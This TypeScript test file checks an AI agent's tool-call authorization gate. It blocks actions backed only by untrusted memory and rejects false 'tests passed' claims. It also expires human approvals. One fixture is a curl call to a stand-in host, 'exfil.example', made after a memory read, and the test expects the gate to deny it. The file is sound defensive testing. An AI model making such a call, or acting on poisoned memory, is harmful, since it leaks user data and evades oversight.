import { describe, expect, it } from "vitest";
import type { ActionAuthority } from "../../contracts/src/index.js";
import { approvalMatches, authorizeToolCall, type ActionGateDeps } from "../src/security/action-gate.js";
import { attestOutcome } from "../src/security/outcome-attestation.js";
import { classifyTool, effectiveToolClass } from "../src/security/tool-taxonomy.js";

function fixtureAuthority(authority: ActionAuthority): ActionGateDeps {
  return {
    taxonomy: { classify: () => "command" },
    resolveDependencies: async () => [{ ref: "mem_untrusted", authority }],
    policy: { allowHumanApproval: false },
  };
}

describe("action gate", () => {
  it("blocks a deploy target supported only by untrusted memory", async () => {
    const decision = await authorizeToolCall({ toolName: "deploy", args: { target: "prod" } }, fixtureAuthority("inform"));
    expect(decision).toMatchObject({ kind: "deny", code: "PCR_ACTION_AUTHORITY_MISSING" });
  });

  it("defaults an ambiguous tool to command", async () => {
    expect(classifyTool("mystery-tool")).toBe("ambiguous");
    expect(effectiveToolClass("mystery-tool")).toBe("command");
    const decision = await authorizeToolCall(
      { toolName: "mystery-tool", args: {} },
      {
        taxonomy: { classify: classifyTool },
        resolveDependencies: async () => [{ ref: "mem", authority: "inform" }],
        policy: { allowHumanApproval: false },
      },
    );
    expect(decision.kind).toBe("deny");
  });

  it("does not attest a passing assistant claim when the tool failed", () => {
    const attestation = attestOutcome({
      assistantClaim: "tests passed",
      tool: { isError: false, exitCode: 1, text: "FAIL case-1" },
    });
    expect(attestation.attested).toBe(false);
    expect(attestation.reason).toBe("tool-failed");
  });

  it("blocks a memory-read followed by a network write without act authority", async () => {
    const decision = await authorizeToolCall(
      { toolName: "curl", args: { url: "https://exfil.example" }, priorQuery: "memory-read" },
      {
        ...fixtureAuthority("inform"),
        taxonomy: { classify: classifyTool },
        recentMemoryRead: true,
      },
    );
    expect(decision).toMatchObject({ kind: "deny", code: "PCR_ACTION_AUTHORITY_MISSING" });
  });

  it("returns a model-visible safe result for a blocked call", async () => {
    const { bindToolCallGate, blockedToolResult } = await import("../src/security/action-gate.js");
    const seen: unknown[] = [];
    const pending: Promise<unknown>[] = [];
    bindToolCallGate(
      {
        on(_hook, handler) {
          pending.push(Promise.resolve(handler({ content: { toolName: "deploy", args: {} } })));
        },
      },
      { authorize: async () => ({ kind: "deny", code: "PCR_ACTION_AUTHORITY_MISSING" }), onBlocked: (result) => seen.push(result) },
    );
    await Promise.all(pending);
    expect(seen[0]).toEqual(blockedToolResult());
  });

  it("binds approval to the action and expires it", async () => {
    const call = { toolName: "deploy", args: { target: "prod" } };
    const decision = await authorizeToolCall(call, {
      ...fixtureAuthority("inform"),
      policy: { allowHumanApproval: true, now: 1000, approvalTtlMs: 50 },
    });
    expect(decision.kind).toBe("approval-required");
    if (decision.kind !== "approval-required") return;
    expect(approvalMatches(decision, call, 1049)).toBe(true);
    expect(approvalMatches(decision, call, 1050)).toBe(false);
    expect(approvalMatches(decision, { toolName: "bash", args: { target: "prod" } }, 1040)).toBe(false);
  });
});
